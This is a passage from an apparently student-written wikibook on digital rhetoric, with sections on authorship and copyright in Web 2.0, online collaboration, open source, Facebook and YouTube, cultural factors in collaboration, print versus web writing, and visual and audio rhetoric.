[http://www.thefreelibrary.com/Wikipedia+and+the+disappearing+%22author%22-a0128607269 Miller] (2005) explored the disappearance of the author in Web 2.0. With the use of the Internet, the roles of the audience and the author(s) have merged, becoming one voice. Traditional values of authorship and ownership are challenged with a wiki. If there are multiple authors and editors on a wiki, who owns the content? Who is the author(s)? Technically the edits on Wikipedia are not totally anonymous; every edit is tracked. However, the author (and owner) has disappeared with the wiki.


'''Ownership and the Web'''

[http://www.usatoday.com/tech/news/2006-07-31-net-plagiarism_x.htm Jones] (2006) reports about recent struggles with copyright violations on the Web. Authors often find their words on many different websites and blogs, often without credit or with another author taking credit for their work. Copyright violation and plagiarism is not only rampant on the Web, but it is also widely accepted. Blogs seem to be the worst offenders; they often copy others’ words or ideas without giving proper credit to the original author or owner. This idea is different from traditional rhetoric, where authors were very possessive of their work. Dell insists that it will take a major high-profile copyright infringement case to diminish plagiarism and copyright violations on the Web.

With the creation of the Internet, it has certainly become increasingly difficult for copyright owners to protect their works from piracy. Copyrighted movie, music, and other media files appear all over the Web everyday, posted without the permission of the owner(s). However, theorists such as [http://www.free-culture.cc/ Lawrence Lessig] argue that copyrights are sufficiently protected, and that this flood of vigorous protection will only harm the freedom of the distribution of ideas and creativity. Copyright has changed rapidly over the past century to include a longer term and wider scope of protection, and yet copyright owners continue to lobby Congress for more protection. The reach of copyright law has also changed, along with the Web. Copyright law is not just enforced by humans anymore, but also by machines. Technology now has the power to place restrictions and &quot;grant&quot; permissions, thus regulating the uses of copyrighted work on the Web. 

While authorship has moved from the elite few to the masses, ownership has gone in the opposite direction. Large corporations control the copyrights of the majority work, such as television shows, movies, and even newspapers. For example, Rupert Murdoch owns a large portion of newspapers and television networks, thus owning and controlling the copyrights of thousands of creative works. The astonishing realization of Lessig's argument is that just a few corporations have an incredible amount of control over the direction of our culture (Lessig, 2004).

== Are the author, authority, and ownership actually threatened by Web 2.0? ==

A number of people enter into Web 2.0 adhering to writing forms more reflective of traditional presentation in print. The problem with this should be obvious. If someone is entering into this environment using the same standards of writing for print media, then they also bring with them the traditional definition of author and authorship. The read-write environment is a threat in that the authority of the writer becomes compromised under standards defined under traditional practice. Some might argue that Web 2.0 destabilizes traditional reasons why many people write for print; to establish an authority in voice and respect for developing original works (though this is challenged by some of the theories of rhetoric anyway). Nonetheless, I would argue that authorship and authority have not died, but rather, they have been redefined for the different writing space that is Web 2.0. The relevance of the author and the authority of the writer are still present in the Web, we just need to understand what differences exist. As interactions and presentations in the read-write Web are further studied, the understanding of the role of the author and authority will change accordingly.

Authorship on the Web is certainly very different from authorship in traditional print. The roles of and relationships between the author(s) and his/her/their audience have shifted. &quot;The reader&quot; has now become &quot;the user,&quot; a role title that implies a higher level of participation than before. The characteristics of the Web, as described by Gurak, have had an impact on the characteristics of authorship online. The different forums of expression in Web 2.0, such as blogs, wikis, and social networking sites have also changed authorship.

In traditional rhetoric, authorship was akin to an exclusive club where only a select few had the distinction of being called &quot;authors.&quot; However, with the introduction of Web 2.0 technologies such as blogs, wikis, and social networking sites, now, anyone with internet access can become an author. But has the mass authorship on the Web diluted the authority of writing? While the authority of writing on the Web has changed from traditional rhetoric, it has certainly not disappeared.


'''The Shift of Author/Reader Roles on the Web'''

The roles of the author and reader have shifted as writing has moved online. Before the Web, there were only three roles: ''the author'', ''the implied author'', and ''the mock reader'' (Bartell, 2001). This theory, from Gibson and Ong, seems to imply that the author has the most important role in the author-reader relationship. This is evident in the mock reader role, in which the author writes for his idea of the reader, not for the actual reader. There is no role for the ''actual reader''. 

With the creation of the Web, the number of author and reader roles increased from three to six: ''the real visitor'', or the actual reader viewing the site; ''the target visitor'', or the visitor for whom the website is designed and targeted; ''the user persona'', the role that the visitor assumes upon participation in the website, determined by the information found on the site; ''the website owner'', the person or organization who owns, finances, and controls the website; ''the designer'', the individual or organization that physically design the website; and ''the author persona'', the person or persona who the reader perceives as the voice or author of the site (Bartell, 2001). The author persona is similar to the ''author function'', as described by Foucault.

In these roles, theorized by Coney and Steehouder before the existence of Web 2.0, we can already begin to see shifts in the roles of the author and the reader. These roles seem to represent the shift from the importance of the author in traditional print to the importance of the audience or individual user in Web 1.0. Coney and Steehouder introduce the role of the target visitor, or the person for whom the owners and designers create the website. Before, the author would write for his or her own idea of the reader (the mock reader), rather than research and explore who the reader actually is. Audience and user analysis, or figuring out the needs and desires of the users, has become more important with the rise of digital media.

In Web 2.0, authorship online has become more significant with the introduction of blogs. Blog readers are able to identify the author through a short biography or by the author's real or pseudonymous name (Warschauer and Grimes, 2007). With the blog, the reader is once again presented with an identifiable author, or author function. If they are widely read, blog authors can be very influential. On the other hand, the author has almost disappeared completely with the wiki (Warschauer and Grimes, 2007). Anyone can edit a wiki, and although the edits are not totally anonymous (all edits are tracked by server number), readers do not know anything about the author. The only means of establishing authority is to view past edits of the wiki writer or editor. With social networking sites, the role of the reader and author have merged. The user is both a reader, viewing the social activity of friends, and an author, posting comments and links for others to see.


'''The Effect of Anonymity, Interactivity, Reach, and Speed on Authorship'''

The characteristics of the Web, as described by Gurak in ''Cyberliteracy'', are ''anonymity'', ''interactivity'', ''reach'', and ''speed'' (2001). These characteristics are key to explaining the qualities of authorship on the Web and prove to be both positive and negative to the shift in authorship as it moves from traditional print to online:

'''Anonymity.''' Authors posting online have the benefit of anonymity. While anonymity facilitates open discussion and participation, it also triggers unpleasant thoughts and emotions, which are inevitable in an online community. Anonymity also allows authors and readers to experiment with different identities and roles, whereas traditional authors must maintain their original identities for the sake of the authority of the work.

'''Interactivity.''' There is an extremely high level of interactivity between authors and their audiences on the Web. Interactivity can be positive, as it allows for the open dialog between the author and his or her audience, but it also allows for increased voyeurism and invasion of privacy. With the Web, authors always reach audiences that are not necessarily the intended audiences.

'''Reach.''' The Web connects millions of people to one another around the world everyday. With a wider reach, the Web becomes an international community, made up of smaller communities. Before the Web, the world has not seen such a widespread and diverse international community. Reach makes it possible for almost anyone to become an author and participate in communication online. 

'''Speed.''' The Web is making content much easier and much, much faster to read and write. With social networking sites like Facebook, back and forth communication on the Web is much more rapid.

With the anonymity, interactivity, reach, and speed of the Web, authorship is now available to almost anyone. The technology of Web 2.0, including blogs, wikis, and social networking sites, has only magnified the characteristics originally described by Gurak. Wikis are written and edited (almost) anonymously; blogs have increased the amount of interactivity between the user and the author; and social networking sites speed up communication and connect users from all over the world.


'''The Increase in Collaborative Writing and Editing'''

Another characteristic of authorship in Web 2.0, particularly of wikis, is collaborative writing and editing. The fact that anyone has the ability to make changes to a wiki has caused critics to challenge the authority and accuracy of wikis. While it may seem that the mass collaborative nature of wikis may pose a threat to authority, the opposite is actually true. Studies have shown that the accuracy of articles on Wikipedia increase when the number of authors and editors contributing to the wiki also increases (Warschauer and Grimes, 2007). Another study revealed that Wikipedia articles were only slightly less accurate than articles in Encyclopædia Britannica (Warschauer and Grimes, 2007). With studies such as these, it is difficult to challenge the authority of the wiki.


'''The Challenge to Ownership on the Web'''

The Web has not just challenged the authority and authorship of work, but it has also challenged traditional notions of ownership. Before the existence of the Web, authors were very possessive of their works (Miller, 2005). In the age of Web 2.0, we have seen the rise of mass collaborative writing on websites such as Wikipedia, where the need for ownership and possession is lost. The content of the article no longer belongs to the author, but instead to the reader(s). Authors of wikis have no claim to their writing once they place it in the wiki writing space. They are still required to attribute credit if the idea is taken from another author, but the ownership of the original content is compromised.  

There is also a major problem with challenges to ownership in the form of copyright infringement. As a 2006 article in USA Today points out, copyright infringement is commonplace on the Web. Oftentimes the same article or information will pop up in different spaces all over the Web, without giving proper credit to the original author or owner. The piracy of copyrighted works is another serious problem. Peer-to-peer file sharing networks are used to share and download music and movie files illegally. 

Right now, copyright owners are waging their own war on copyright infringement (Lessig, 2004). But is ownership really threatened? Are owners taking the war on piracy too far? Lessig argues that there is really no need for the war on piracy, and that although the Web does make it more difficult for owners to protect their work, the work is still sufficiently protected.

== '''The Four Ideas of Collaboration''' ==
'''Openness'''

Openness on collaboration among businesses and government will create a productive collaboration to provide an effective strategy to improve creation and knowledge socially, technologically, politically and strategically.

In our modern digital age especially in the last decade and with the help of internet innovation, that has transformed the way our societies collaborate.
Openness in business changes the way businesses are run, with the openness of collaboration they can bring a best opportunity and better effects to bring their business profit. This would increase the idea if they collaborate with people from different part of the world which could provide different idea for better creation and innovation.

Most of professional companies are realizing that openness is a great tool to compete with their competitor. Companies and organization need to know when, and how to allow individuals to share idea and innovation on their business platform participation. Amazon, eBay, Google, and flicker are an open plat form which allows third parties to participate in their platform. For example “Amazon, and open-platform prodigy, harnesses the power of 140,000 active developer and gains nearly 30 percent of its revenue from third-party seller that leverage its e-commerce engine.”(Tapscott and Williams)
[http://books.google.com/books?id=-WUhErZgmpoC&amp;pg=PA276&amp;lpg=PA276&amp;dq=openness+and+wikinomic&amp;source=bl&amp;ots=i8RZbs-jKn&amp;sig=XPOu4YT6KDqOzIWsPP11xOvzz7E&amp;hl=en&amp;ei=-GjnSfPMAZvpnQfRo7WIBw&amp;sa=X&amp;oi=book_result&amp;ct=result&amp;resnum=7#PPP1,M1/ “how mass collaboration changes everything”]


Openness in government allows each agency to create more service and would transmit to more and productive way. Internet provides openness to provide a better and greater tool to improve in all levels of collaboration.
 
Open collaboration also have a greater effect on each individuals, going back to the topic of remixing and creative of common of our discussion earlier in the semester. YouTube is a great example of an open collaborative tool which allows each individual to post, remix, share, share and discuss a post. This is an effective way to improve the creation of individuals, which is getting the ideas to allow individual to improve his or her post.   

'''Peering'''

“Peering is voluntary interconnection of administratively separate Internet networks for the purpose of exchanging traffic between the customers of each network.” Peering are idea, information and other useful sources that are being shared among individuals to improve the creation of one other. Peering and collaboration will provide each individual to exchange idea with each other.  Online collaboration creates peering effortless to the user and it would help them to gain information, and get a feedback from other about his or her creation.

Peering applications such as [http://limewire.com LimeWire] and [http://www.ares.net Ares] allow computer users to upload documents, videos, music, and or programs in order to share with a wide rang of people. Typically these programs have a negative connotation because they promote rampant piracy. However, these Peer 2 Peer (P2P) programs allow for mass collaboration at the blink of an eye. Majoring of corporation are using decentralizing decision and with communicating “peer-to-peer fashion, which allows employee to take up new ideas to communicate easily and openly among each other.

[http://www.youtube.com/watch?v=H_jhLGxH-m4&amp;eurl=http%3A%2F%2Fwww.wikinomics.com%2Fblog%2F&amp;feature=player_embedded/ “Peer-Peering among individuals”]

'''Sharing'''

Sharing is an exchange of files such as document, audio, video, PDF and other digital file on a computer network. File sharing can be used in variety of different way. Peer-to-Peer files sharing is a content of file sharing particularly anything in digital format.[http://en.wikipedia.org/wiki/File_sharing/&quot;Peer-To-Peer&quot;]With the modernization of high-speed Internet file sharing has became popular among individuals. 

One of the most excellent sharing service is “Drop.io is an excellent private file sharing and collaboration service”. This service allows the user to share a variety of different file. This service is mostly used by organization, corporation and other private user to share file among selected individuals.[http://www.drop.io.com/&quot;Drop.io&quot;] allows accessed individual to “shared on ‘View only’, ‘View &amp; Add Notes’, ‘View, Add Notes &amp; Files’”. User can create as much storage as they desire, and they have an option to protect by creating a  password for their preferred file. This service allows individual to set an automated delete drop, this will give them control of how long should they keep a post. 
Sharing can be used to increase knowledge and ideas among individuals, when we talk about sharing it doesn’t have to be illegal sharing. User can take an advantage to share idea on blog post, discussion and get idea from others creation. 

[http://www.makeuseof.com/dir/dropio/&quot;Article on Dropio&quot;]

'''Acting Globally'''

With more companies looking to expand world-wide it is important to realize what is meant by the phrase [http://reference.igi-online.com/content/details.asp?id=20732&amp;keywords= acting globally]. When working in a global team through a virtual office (online) teams of workers need to understand the different cultures in which they are collaborating with. Each member in a team should voice their expectations for a project in order to work cohesively. Issues with copyright also arise when working in a global market. One country's copyright laws may be completely different than another country's laws. Collaborators need research the laws of their fellow co-workers in order to know what the limitations are for each country. Technology, and the ability to transmit data, needs to be up-to-date in order to smoothly collaborate between teams of people in different parts of the world. Workers in a global collaboration need to know and be trained in the technology they use or else communication and collaboration will never work globally. Co-workers should not use culturally specific language, such as slang and terminology only used in certain countries. When acting globally everything should be in a simplified language. In order to create a positive relationship when working with people on a global scale, co-workers should respect cultural differences and not try to force their culture on others.

Collaboration tools such as [http://www.skype.com Skype] and [http://www.cisco.com Cisco] telecommunication software programs are becoming the norm in order for collaboration to occur globally and cheaply. Instead of traveling everywhere companies are choosing to invest in the technologies of telecommunication in order to cut costs and instantly communicate visually at the push of a button. Technology is continually changing on a daily basis. Recently, Skype created a Skype application for Apple's iPhone and iPod Touch in which anyone with a Skype account can talk on their iPhone or iPod Touch for free using a Wi-Fi or wireless internet connection. This allows for people all over the world to communicate with each other for free, again with the push of a button.

== '''Open-source and its Importance in Collaboration''' ==
Forms of collaboration online are most likely open-source or partially open-source. Open-source can be defined as having the ability to share forms of digital media that is not traditionally packaged and sold to consumers in stores. An open-sourced program allows for anyone around the world to make changes to coding of software or websites in order to improve upon them, making the digital coding better or more up-to-date. An example of an open-sourced program is the internet browser Mozilla [http://www.mozilla.com Firefox]. Firefox invites programmers from all over the world to work on the design and update the features and security of the internet browser. Updates for Firefox occur on almost a monthly basis in order to keep the browser as secure as possible. There is more of a chance of someone catching someone else's errors and as well as the ability to have more consistent updates. This is different from traditional browsers like Microsoft's [http://www.microsoft.com/windows/downloads/ie Internet Explorer] which has big updates every few years. The ability to have many different people collaborating over a digital space allows for people to work eliminating physical barriers such as workspace and travel costs. More eyes have the ability to view something that is open-sourced rather than only limited to a workforce of a dozen people.

Examples of partially open-sourced digital media is the website [http://wikipedia.org Wikipedia] and the tool [https://www.google.com/accounts/ServiceLogin?service=writely&amp;passive=true&amp;nui=1&amp;continue=http%3A%2F%2Fdocs.google.com%2F&amp;followup=http%3A%2F%2Fdocs.google.com%2F&amp;ltmpl=homepage&amp;rm=false Google Docs]. Wikipedia, as everyone knows, is the most popular form of collaboration on the internet. It is a gigantic digital encyclopedia. Everyone, who has access to a computer and the internet, can access Wikipedia. A user can read every page on Wikipedia and make changes to or add information to Wikipedia as they see fit. However, people cannot make changes to how the website looks or operates. Thus, it is partially open-sourced. Google Docs, another partially open-sourced tool, opens the door of collaboration to anyone who has a Google account. A user has the ability to create or upload a document to Google Docs and work completely online. No data is stored on a user's own computer which allows for &quot;lighter&quot; computers. Where partial open-source comes into play is with editing of the actual content of a Google document. An original creator of a document has the ability to choose who can edit and access their document. Having the ability of online data storage, apart from traditional data storage on a user's computer, is that a user does not need massive programs such as [http://office.microsoft.com/en-us/default.aspx Microsoft Office] (which includes Word, Excel, PowerPoint, etc.). Not only are computers lighter but all files can be shared seamlessly with other people. Collaboration is becoming effortless in that people no longer have to send their documents back and forth by e-mail or hard-copy, everything is located easily online.

[http://www.theoscarproject.org The OScar Project] is an experimental open-source project that is unique. Can the concepts of open-source be applied to material objects? OScar is short for open-source car. The project is a new approach to online collaboration. The article [http://www.businessweek.com/innovate/content/dec2006/id20061208_509041.htm “Open-source at 90 mph”] quotes the project's founder, Markus Merz, of wanting to build &quot;a car without an engineering center, without a boss, without money, and without borders&quot; only with &quot;the help of the collective creativity of the Internet community.&quot; The project uses the concepts of open-source in the designing of a smart car by many collaborators from their own computers over the internet using the same concepts talked about in these collaboration chapters. The OScar's prototype will eventually be physically built as a result of all the collaborators' efforts. The OScar project is now using their own Wiki as a source for user documentation. The OScar project emphasizes mastering of the process and thorougness rather than working towards a deadline. This is a common emphasis that appears in all open-sourced products, allowing for future innovations. 

== '''New Forms of Collaboration''' ==
Now, more than ever, people are having a bigger impact on different forms of digital technology. Recently, the team of [http://www.xbox.com Xbox] decided to open its online world of Xbox Live (a social network for gamers to play together using the internet) to game developers in relation to Xbox 360. The Xbox 360 game development kit by [http://msdn.microsoft.com/en-us/xna/default.aspx XNA Game Studio] is available to Xbox Live members through the online marketplace. This software allows the gaming community to develop their own games and post them to be purchased by gamers on Xbox Live. These small time developers make money when gamers download their games to their own Xbox console. The development kit encourages people to create and market games they make with the kit and sell them without having to invest a lot of money into a game. This has the ability to allow professional and novice creators alike to create something that expresses what they enjoy while allowing others to enjoy their ideas as well for a fairly cheap price.

A [http://www.businessweek.com/innovate/content/mar2007/id20070326_237620.htm?chan=innovation_special+report+--+the+businessweek+wikinomics+series_the+businessweek+wikinomics+series wiki workplace] allows for information to be easily accessed and maintained in order to have a powerful informational tool. Wikis are beginning to be used more in the workplace because of the start of a younger workforce entering the business world. This younger workforce is more likely to use the new features related to web-based technology. The same concept of using a Wiki was applied for the creation of these chapters you are now reading. Wikis help spur creativity and growth allowing for anyone within a company to state their own ideas and contribute more to a company. Recently IBM hosted [http://www.businessweek.com/innovate/content/feb2007/id20070212_914411.htm?chan=innovation_special+report+--+the+businessweek+wikinomics+series_the+businessweek+wikinomics+series InnovationJam]. InnovationJam was an giant online brainstorming meeting. IBM employees, no matter where they were in the world, had the ability to join the online meeting in virtual space. The online meeting included 100,000 people from 160 countries working for IBM and occurred over two 72 hour sessions.

== '''Collaboration on Facebook''' ==
Facebook mass animation project with collaboration of both of Intel and Dell will create a major project with gathering idea from massive collaborator. This collaboration will enable the animator or a fan to collaborate on a live music. On this project collaborator will contribute scenes up to five-minutes which could be selected as a leap into feature film. Using facebook makes collaboration easier from a variety of music from different part of the world, different background, ethnicity and cultures. I think collaboration on facebook have became a greater impacts on millions of users around the world. Digital collaboration made sharing and idea easy which allows different individual to layout his or her idea to accomplish the great project. Now anyone can sign up for facebook, and would be capable to collaboration, chat, create group page, and share idea with anyone they desire. 
	
Third party developer might not expect what a serious possibility facebook might offer. In today digital age almost everyone have access to internet. Varieties of peoples are addicted to online collaboration either chatting with buddy, post blogs, post videos and online document. With an idea of creating &quot;MyOffice&quot; facebook will help businesses and other large corporation to collaborate and discuss multi project with a variety or client and business partner. This new application allows individuals who are part of that &quot;group to organize event, schedule meeting, discuss ideas and much more&quot;. 

[http://www.nudgelondon.com/blog/2008/11/collaboration-on-facebook-serious-business/&quot;Facebook Collaboration&quot;]

The new featured tool that facebook is providing will enhance collaboration among students on universities, businesses that have limited space. &quot;Huddle Workspaces&quot; allows individual to work on their site such as LinkedIn inside facebook. Another tool that will improve collaboration on facebook is study groups, which allows students, organization to collaborate and share ideas post discussion remix and edit each other posting. It’s more like create of commons which allows users to create tools for other user to share information. This tool allows the creator to have the complete ownership of their creation.
Create of common law is base on the idea of digital rhetoric, which is provided to variety of user around the world. Manifestations of digital rhetoric play a big role in create commons that allows other people to extend their creation by sharing the idea form other.

== '''YouTube and Collaboration ''' ==
YouTube is becoming a great factor in our social life, with the creation of active sharing which allows the user flag the content that they are currently viewing. YouTube is an open video source where anyone can post, edited and remix a video from all part of the world. When the user put and active sharing on a currently playing video they, anyone can see his or her user name who’s viewing the same video at the same time. YouTube want to expand their videos beyond web browsers and distribute their video onto mobile and television. YouTube also providing platform for user to post idea debate based on the posted item. 

Using blogs and wikis could be a greatest effect on mass collaboration among business. “YouTube already shares ad revenue with the best producers of video on its site and people make a living this way,” says Williams, referring to such individuals as “prosumers”.

[http://www.watblog.com/2008/02/15/next-on-youtube-recommendations-and-advertiser-analytics-what-about-collaboration/&quot;YouTube Collaboration&quot;]

YouTube is about to take collaboration; some companies are struggling to keep its employee form watching YouTube, while some corporation is creating corporate YouTube. Company like “Philadelphia-based Rohmand Haas C “created YouTube Corporate to provide its employee access of training video, and information about variety of topic in their corporation. An advantage of Corporate YouTube will help companies to achieve important goal in a short period of time. Corporate YouTube will eliminate traveling cost, and employees’ time this will get their training easier, since they can get most of the training via video site. This allows employee to create post, view video which provide important information about their corporate.  Most corporations are in the stage of posting information about their marketing production on YouTube to improve sale.

Distribution video on YouTube is free, and the cost of production is affordable since most people don’t expect high quality. When viewer video a video they don’t look for quality, instead they are looking to gain the most important out of the video. Once companies and corporation allows worker and other external user to post video about their brand products and new creation it will help the corporate to improve its innovation.

== '''How Culture Effects Collaboration''' ==
Culture plays a major role in collaboration. It is something that needs to be overcome in order for collaboration to successfully occur. Dutch psychologist Geert Hofstede conducted surveys while working at IBM, in the human resources department, in Europe. Hofstede's surveys were attempting to discover &quot;how people solved problems and how they worked together and what their attitudes were to authority.&quot; This in depth research is now part of the Hoftstead Dimensions. Hoftstead discovered that the top five countries that did not stray from rules or plans and would continue with procedure no matter what were 1. Greece 2. Portugal 3. Guatemala 4. Uruguay 5. Belgium. The five countries at the bottom of the list, which could deviate from a plan if necessary, were 49. Hong Kong 50. Sweden 51. Denmark 52. Jamaica 53. Singapore. Hofstead's Dimensions most known theory is the Power Distance Index (PDI). This relates to how cultures values or respect authority. For example, in many countries, people are afraid to disagree with their boss because they feel like their boss has the final word. This would be an example of a high-power distance. In the United States, there tends to be a low-power distance in which people typically see themselves as on the same playing level. There has been research that correlates plane crashes with the Power Distance Index (the top of the scale having more plane crashes). The top five Power Distance Index countries are 1. Brazil 2. South Korea 3. Morocco 4. Mexico 5. Philippines and the lowest on the scale are 15. United States 16. Ireland 17. South Africa 18. Australia 19. New Zealand ([http://books.google.com/books?id=8EspMAAACAAJ&amp;dq=outlier:+the+story+of+success Gladwell 177-223]).

In order for collaboration to occur between cultures the mindsets of the collaborators need to be open and multiple questions need to be asked. Most collaborations between cultures fail before they even get started. This is often the case when companies market their products globally. Problems occur when companies do not research their target market, seeing markets as their own (ego-centrism). The food company Kellogg produced their cereal Cornflakes in India. India does not like to start their day with cold sensations such as cold milk on cereal. When you pour warm milk on Cornflakes it turns soggy fast. Kellogg needed to backtrack and develop the cereal to hold up in warm milk as well. Kellogg could have avoided the problem all together if they had collaborated with people from India before marketing their product.

Whirlpool, another company that marketed to India without collaborating first with people in India, created washer machines that had the word &quot;Sari&quot; cycle instead of &quot;Delicate&quot; cycle. The problem with this was Whirlpool did not change the force in which the &quot;Sari&quot; cycle operated and when people in India washed their finely woven clothes or Sari in their washer machines, their clothes would be caught up and destroyed in the machines. Whirlpool could have avoided having to design another washer machine and lose their market shares in India if it had just collaborated with India and communicated their intentions to better understand the culture ([http://www.humanfactors.com/downloads/documents/Interactions_WashingMachine.pdf Chavan]).

== '''Composing vs. Writing''' ==
Do you use the words &quot;composing&quot; and &quot;writing&quot; interchangeably? Despite popular belief, a distinction between the two words does exist. Composing is when you take basic elements to arrange something, and writing is the action of adding text after thoughts and ideas are composed. Composer Nolan E. Schmit moderates a blog titled &quot;[http://blog.thecomposersnotebook.com/category/advice-and-tips/ The Composers Notebook Blog].” One of the topics distinctly addresses the difference between writing and composing. Composing is the “act of creating musical ideas,” while writing is “translating the musical ideas into a form that can be read by others.” Although the focus of these definitions is in music, they still apply to the topic at hand. In other words, composing is the brainstorming process and arranging of ideas, while writing is the presentation of ideas. 

If you've read the [http://en.wikibooks.org/wiki/Digital_Rhetoric/Introduction_to_Rhetorical_Practices &quot;Introduction to Rhetorical Practices&quot;] section, you'll notice that these definitions are similar to the canons of classical rhetoric. For example, the composing aspect correlates with the [http://rhetoric.byu.edu/canons/invention.htm invention] and [http://rhetoric.byu.edu/canons/arrangement.htm arrangement] stages of classical rhetoric, while the writing aspect links to the [http://rhetoric.byu.edu/canons/style style] and [http://rhetoric.byu.edu/canons/delivery delivery] stages of it. Therefore, it is important to recognize the difference between composing and writing, because it demonstrates how aspects of classical rhetoric is still present in that of digital rhetoric.

== '''Print/Traditional Writing and Web/Electronic Writing''' ==

Has there become a separation between writers? In this day and age people can write in two different mediums, the electronic and print. The difference between the two comes from the style of the writing and the audiences that will be reading it.  It has become more prestigious to have one’s name on the spine of a hardbound book but people also take pride having their name, or alias, attached to online content. The web is an active medium and can only be worked by people who expect instant results. The world of print writing is more patient.  To get a written work published one has to mail it to publishers wait for a confirmation and then do  as many edits as the publisher says to do so.

Composition of web writing deals with sense of design concerning: color, typography, composition, navigation, and hypertext, as well as the mechanical basics of specific programs being used. All of these skills can be taught threw basics and later at a gradual pace be advanced to something creative ([http://www.academiccommons.org/commons/essay/multimedia-composition Nguyen], 2009). The web has given people the ability to create something colorful and insightful.  Print writing does not give creators the option to insert different colors and fonts or even a graphic or two to their composition.  Research shows that 79% of the users on the internet do not even read websites word-for-word but instead glance over the headings and use the information they need ([http://www.kerryr.net/webwriting/guide_web-vs-print.htm Redshaw], 2003).

Online content also gives readers the ability to click on hypertext and find the sources of the topic they are reading. With the web writing, writers can portray exactly what they are trying to say with videos and audio, which the print medium cannot provide completely.  In the print world those concepts are a separate entity. The web also provides readers with an active medium where they can make decisions and interact with what they are reading or even add their own opinion ([http://www.useit.com/alertbox/print-vs-online-content.html Nielson], 2008).

When writing into a word processor, it is a digital tool, and also leads to a hard document or online content. The hard documents though limit the freedom of the reader and it gives them few options on how to attain the information. The reader can either “skim” the document which will show a general idea of the work or they can read the document word-for-word and that will give them all of the knowledge written on the paper. The role of the reader is to be in the background just listening, like in a lecture. Online writing has become more active, allowing openness and future editing by other parties. Once a book is printed though it is hard to recall copies and edit what is already printed on book's pages. This is why writers do drafts though, so when the final product is about to be published and shipped out, the work is in &quot;perfect&quot; condition.

The web site on the other hand allows for the reader to interact with what they are reading.  It also allows for an abundance of mixed media from pictures and text to audio and video.  The reader can click and watch a video explaining what they could read or listen to a narrator speak the text in front of them. This interaction with the information allows for more of it to be acquired and processed.  Using the internet brings a hands-on experience to the reader which can be seen in the constructivist theory saying that people learn from experiences they have everyday.  This drives the web site further because now the reader is experiencing the information they are reading, leading to a better understanding of the knowledge.

== '''Traditional Written Media and Mixed Media''' ==

Some examples of traditional written media include books, newspapers, magazines, newsletters, and journals. These forms of written media may be accompanied by pictures, but that is as far as the mix goes. In Les Manovich's article &quot;[http://www.pz-writing.net/courses/Manovich_understanding%20mixed%20media.pdf Understanding Mixed Media]&quot;, he describes this hybrid visual language as &quot;combining video, layers of 2D imagery, animation, and abstract imagery generated in real time.&quot; Most of these combinations tie into the following examples: commercials, music videos, and motion and TV graphics. The main distinction between the two types of media is that traditional written media is quite stagnant, while mixed media is much more dynamic.

Digital rhetoric creates a different avenue of learning. According to the Writing In Digital Environments [http://english.ttu.edu/kairos/10.1/coverweb/wide/kairos4.html (WIDE)] Research Center Collective, the tools of writing (e.g. alphabet, word, sentence) objectify language, while adding multiple media draws us closer to obtaining knowledge. In other words, if you wanted to learn about blogs, you may develop an adequate understanding of it by simply reading about it in a print article or journal or a section in a book; however, to fully understand it, you may want to use multimedia aids. Take a look at [http://commoncraft.com/blogs &quot;Blogs in Plain English&quot;] by Common Craft, a husband-and-wife team who facilitates learning for various audiences. Their depiction uses layers of 2D imagery, audio, and animation to illustrate what blogs are and why they're important. In an ever-evolving world in which a majority of us would rather ''see'' how things work rather than ''read'' about it, digital rhetoric offers a solution. The [http://www.youtube.com/watch?v=sH7Jz3TY3h8 &quot;Why Should YOU Come to JMU&quot;] clip is another example of how mixed media works in favor of traditional media. Prospective students who are unable to visit the college may only get the experience through brochures and other traditional media; however, this multimedia presentation offers a creative approach to persuading students to come to JMU.

      <text xml:space="preserve">== '''Genres and Media''' ==

Within the realm of digital rhetoric is this concept of genres and media. Of course there are countless areas to consider but the focus of this reading will be on visual, audio, and text rhetoric and how those concepts are put to practice in digital rhetoric. 


== '''Visual''' ==

A persuasive visual piece that is designed to make an argument or convey meaning is the most common definition used to describe visual rhetoric. Visuals can take many different forms. They can be a painting, a photograph, or even landscaping. Visuals allow people to make quick judgments regarding an issue. Of course, this is not always a good thing. Often visuals do not show all the context of an argument the way other rhetoric’s may. 


Visuals are important and helpful to the learning process. The alphabet was the beginning of the visual rhetoric playground. Visuals offer a new sense of understanding for the world. No longer do persons have to rely on someone to read to them; they could do it themselves and begin making their own interpretations. 


Visual literacy is how one understands “non text” based concepts. &quot;Non text&quot; are things such as the font style used, the size of a font, the colors used, are the pictures real or manipulated. The concepts help one to understand a visual. According to the [http://www.stanford.edu/~steener/f03/PWR1/whatisvisrhet.htm Duke University], Writing Studio, visual literacy is the ability to read and write images with meaning. 


In an interview with [http://www.jmu.edu/wrtc/faculty.html Assitant Professor Billie Jones] under the department of Writing Rhetoric and Technical Communication at James Madison University she argues that everything is rhetorical from writing to body language people are always creating meaning. However, in the realm of visual rhetoric, her specialty, she feels that the most important concepts in visual rhetoric are the rhetorical situation or context, design, knowing the audience, and knowing the purpose of the visual. As an incredibly visual culture, it is important for us to take these concepts into consideration when creating and analyzing a visual. 


In a world that is becoming more globalized visuals are becoming more common and essential for helping people understand ideas. Visual images are everywhere around us, attempting to persuade our thoughts. Visuals help to explain what is written in text or said in oral or audio messages. Visuals, unfortunately, allow a lot of room for misinterpretations. Each person evaluates pictures differently. 


There are many forms that visual rhetoric may take, however one example that we might not often consider is the landscaping of a university. Often the landscape is the first impression that is made on a prospective student. The university will typically spend countless dollars on making sure that the flowers are pretty, the grass is green, and if it were possible, they would make sure that it was the picture perfect moment with snow or sunshine. 


In a digital world, visuals are used all around us. Visuals are used to create websites, blogs, convey information and much more. A newer way to use visuals would be the popular virtual world [http://secondlife.com/whatis/ Second Life]. This animated world allows businesses to create their ideal working conditions without ever leaving home. This highly interactive site, allows users to create “avatars” which represent themselves in the virtual world. 


This YouTube clip explains the different elements that are within a [http://www.youtube.com/watch?v=Hkr2KVr8Aa0 visual argument]. 


Here is an [http://williamwolff.org/wp-content/uploads/2009/01/obama-address-wordle1.gif example] of text used as a visual.


More and more visuals are using all the elements that technology can offer to create the most persuasive meaning or argument. Although, visuals offer many great things there is much more room for misinterpretations. Every person will not notice or evaluate a visual in the same way, but by adding other aspects, a more clear definition or argument can be made.Persons should also be carful not to read to much into visuals because this can begin to create situations that were not intended. 


== '''Audio''' ==

Audio rhetoric is used in many forms of digital media today and provides a certain appeal to get a specific point across. Currently the use of sound separation is allowing for a new dimension in audio technology. 

According to Heritage365 and the importance of audio, [http://www.heritage365.com/articles/the-importance-of-audio.asp Audio guides] are excellent for certain forms of interpretation. They are personal, language specific,designed for many informational levels and allow the visitor to progress through an exhibit at their own speed. They are becoming multi-dimensional and therefore potentially more a part of any core concept.

